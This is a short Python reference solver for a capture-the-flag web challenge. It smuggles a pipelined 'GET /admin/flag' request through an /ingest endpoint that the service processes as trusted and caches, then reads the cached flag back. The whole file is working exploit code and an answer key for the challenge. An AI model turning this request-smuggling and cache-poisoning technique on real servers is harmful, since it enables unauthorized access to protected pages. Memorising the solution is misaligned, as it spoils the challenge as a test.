#!/usr/bin/env python3
"""Reference solver for web-cms-smuggle.

Smuggle a pipelined GET /admin/flag through /ingest (processed as trusted and
cached), then read it back from the cache.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, data=None, method="GET"):
    req = urllib.request.Request(url, data=data, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    body = "POST /ingest\r\ncontent=hello\r\nSMUGGLED GET /admin/flag\r\n"
    _req(base + "/ingest", data=body.encode(), method="POST")
    return _req(base + "/page?p=/admin/flag")["cached"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
